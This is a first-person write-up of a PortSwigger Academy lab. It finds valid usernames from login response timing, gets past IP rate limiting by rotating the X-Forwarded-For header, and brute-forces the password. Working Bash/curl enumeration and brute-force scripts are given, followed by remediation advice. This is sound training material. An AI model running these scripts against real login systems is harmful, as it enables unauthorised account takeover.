# Username Enumeration via Response Timing

> **Platform:** PortSwigger Web Security Academy
> **Category:** Authentication Vulnerabilities
> **Lab:** Username enumeration via response timing
> **Difficulty:** Apprentice
> **Goal:** Identify a valid username through response timing, brute-force the password, and log in successfully.

---

## 1. Lab Overview

This lab focuses on username enumeration through response timing.

The application appears to return a generic error message for failed login attempts, but it takes longer to respond when a valid username is submitted with a very long incorrect password.

The lab also provides a known valid account:

```text
Username: wiener
Password: peter
```

This known account can be used to understand how the application behaves when a valid username is supplied.

---

## 2. Vulnerability Summary

The vulnerability exists because the application processes login attempts differently depending on whether the username is valid.

When an invalid username is submitted, the application quickly rejects the request.

However, when a valid username is submitted with a very long incorrect password, the application takes noticeably longer to respond.

This timing difference can be used to identify valid usernames.

The application also applies IP-based rate limiting after too many failed login attempts. However, the lab trusts the `X-Forwarded-For` header, which makes it possible to bypass the rate limit by changing this header for each request.

---

## 3. Initial Analysis

After launching the lab, I opened the login page and started testing the login behavior.



Since the lab provided valid credentials, I used them as a baseline to understand how the application responds to valid and invalid usernames.

The provided credentials were:

```text
wiener:peter
```

---

## 4. Baseline Timing Test

I first measured how long the application took to reject a login attempt with an invalid username.

```bash
curl -s -o /dev/null -w "%{time_total}\n" \
  -X POST "0ad300f5030dd2ae81c0d5e200a40063.web-security-academy.net/login" \
  -d "username=carlos&password=test123"
```

The `curl` options used here were:

* `-s` runs curl silently.
* `-o /dev/null` discards the response body.
* `-w "%{time_total}\n"` prints only the total request time.
* `-X POST` sends a POST request to the login endpoint.
* `-d` sends the username and password parameters.

The invalid username request took approximately:

```text
0.966468 seconds
```

Then I tested a known valid username with an incorrect password.

```text
Username: wiener
Password: test123
```

This request took approximately:

```text
0.991043 seconds
```

The difference was very small, so this was not enough to reliably confirm a timing issue. It could have simply been caused by normal network fluctuation.

---

## 5. Confirming the Timing Difference

To confirm whether response timing could reveal a valid username, I tested the known valid username with a very long incorrect password.

This time, the response took much longer:

```text
9.154350 seconds
```

This confirmed that the application behaves differently when the username is valid.

For comparison, logging in with the correct credentials took approximately:

```text
1.007529 seconds
```

This showed that the long delay was caused by the application processing the long incorrect password for a valid username.

---

## 6. Rate Limit Issue

While testing, I ran into a rate limit.

After too many incorrect login attempts, the application displayed a message saying that too many incorrect login attempts had been made.


The rate limit appeared to be based on the client IP address.

To bypass this in the lab, I used the `X-Forwarded-For` header and changed its value on every request.

Example:

```http
X-Forwarded-For: 127.0.0.1
```

In curl, this can be added using the `-H` option:

```bash
-H "X-Forwarded-For: 127.0.0.1"
```

By changing this value for each request, every attempt appeared to come from a different IP address.

---

## 7. Username Enumeration Script

I wrote a Bash script to test each username with a very long password and measure the response time.

```bash
#!/usr/bin/env bash

i=1
HOST="0a8700b20449bc4c806b9e2f005600e6.web-security-academy.net"
PASS="$(printf 'A%.0s' {1..1800})"

while IFS= read -r username; do
  time_taken=$(
    curl -s -o /dev/null -w "%{time_total}" \
      -X POST "https://$HOST/login" \
      -H "X-Forwarded-For: 127.0.0.$i" \
      --data-urlencode "username=$username" \
      --data-urlencode "password=$PASS"
  )

  if awk "BEGIN {exit !($time_taken > 2)}"; then
    echo "[+] Possible valid username: $username | Time: $time_taken"
  fi

  i=$((i+1))
done < user_list.txt
```

### Script Explanation

The script starts with:

```bash
i=1
```

This variable is used to change the `X-Forwarded-For` header on each request.

```bash
HOST="0a8700b20449bc4c806b9e2f005600e6.web-security-academy.net"
```

This stores the lab host so that it does not need to be repeated throughout the script.

```bash
PASS="$(printf 'A%.0s' {1..1800})"
```

This generates a long password containing 1800 `A` characters.

A long password is used because valid usernames take noticeably longer to process when paired with a long incorrect password.

The script then reads usernames from `user_list.txt` one by one:

```bash
while IFS= read -r username; do
```

For each username, it sends a login request and records the total response time:

```bash
curl -s -o /dev/null -w "%{time_total}" \
```

The `X-Forwarded-For` header is changed on every request:

```bash
-H "X-Forwarded-For: 127.0.0.$i"
```

This helps bypass the IP-based rate limit in the lab.

The username and password are sent using `--data-urlencode`:

```bash
--data-urlencode "username=$username" \
--data-urlencode "password=$PASS"
```

Finally, the script checks whether the response took more than 2 seconds:

```bash
if awk "BEGIN {exit !($time_taken > 2)}"; then
```

I used a 2-second threshold to allow for normal network fluctuations. The known valid username took around 10 seconds with a long password, so usernames with significantly higher response times were worth investigating.

---

## 8. Username Enumeration Results

After running the script, I got the following results:

```text
[+] Possible valid username: wiener | Time: 10.196822
[+] Possible valid username: ftp | Time: 6.063036
[+] Possible valid username: pi | Time: 2.243165
[+] Possible valid username: accounting | Time: 2.523321
[+] Possible valid username: acid | Time: 8.939685
[+] Possible valid username: ag | Time: 2.173515
[+] Possible valid username: al | Time: 2.909626
[+] Possible valid username: an | Time: 2.028154
[+] Possible valid username: apache | Time: 2.838334
[+] Possible valid username: austin | Time: 2.278995
```



Several usernames crossed the 2-second threshold, likely due to network fluctuation.

However, two usernames stood out because they took significantly longer than the others:

```text
acid | 8.939685 seconds
ftp  | 6.063036 seconds
```

Since `acid` had the highest response time among the candidate usernames, I tested it first.

---

## 9. Password Brute Force

After identifying `acid` as the most likely valid username, I wrote a second script to test passwords from the provided password list.

```bash
#!/usr/bin/env bash

HOST="0ad300f5030dd2ae81c0d5e200a40063.web-security-academy.net"
NORMAL="Invalid username or password."
i=1

while IFS= read -r password; do
  msg=$(
    curl -s -X POST "https://$HOST/login" \
      -H "X-Forwarded-For: 127.6.1.$i" \
      --data-urlencode "username=acid" \
      --data-urlencode "password=$password" \
      | grep -oP '<p class=is-warning>\K.*(?=</p>)'
  )

  if [[ "$msg" != "$NORMAL" ]]; then
    echo "[+] Found Password = $password | [+] Relevant Message = $msg"
  fi

  i=$((i+1))
done < pass_list.txt
```

This script sends each password with the username `acid`.

It also changes the `X-Forwarded-For` header on every request to avoid triggering the IP-based rate limit.

The script looks for a response that does not contain the normal failed-login message:

```text
Invalid username or password.
```

When the login succeeds, the warning message is no longer present, so the script prints the possible password.

The script found the password:

```text
aaaaaa
```



I also tested `ftp`, but it did not produce a valid password from the provided password list.

This confirmed that the valid credentials were:

```text
Username: acid
Password: aaaaaa
```

---

## 10. Successful Login

I logged in using the discovered credentials:

```text
Username: acid
Password: aaaaaa
```

The login was successful and the lab was completed.



Lab Khatam Shud!

---

## 11. Remediation

The application should not reveal valid usernames through timing differences.

To fix this issue:

* Ensure login processing takes a consistent amount of time for both valid and invalid usernames.
* Avoid performing expensive password checks only after confirming that a username exists.
* Use a generic error message for all failed login attempts.
* Apply rate limiting based on reliable client identification.
* Do not blindly trust user-controlled headers such as `X-Forwarded-For`.
* Add account lockout or temporary throttling after repeated failed login attempts.
* Monitor repeated authentication failures for brute-force activity.

---

## 12. Lessons Learned

* Username enumeration can happen through response timing, not just visible error messages.
* Small timing differences are not reliable enough on their own.
* A long incorrect password can exaggerate timing differences and make the issue easier to detect.
* Rate limiting can be bypassed if the application blindly trusts `X-Forwarded-For`.
* Using decimal-aware comparisons is better than cutting timing values into integers.
* It is better to identify the valid username first, then brute-force only that account’s password.

---

## 13. Final Summary

This lab demonstrated username enumeration through response timing. Invalid usernames were rejected quickly, while valid usernames took much longer to process when submitted with a very long incorrect password. By measuring response times with `curl`, I identified `acid` as the valid username. The application also used IP-based rate limiting, which was bypassed by changing the `X-Forwarded-For` header on each request. After identifying the username, I brute-forced the password and successfully logged in with `acid:aaaaaa`.
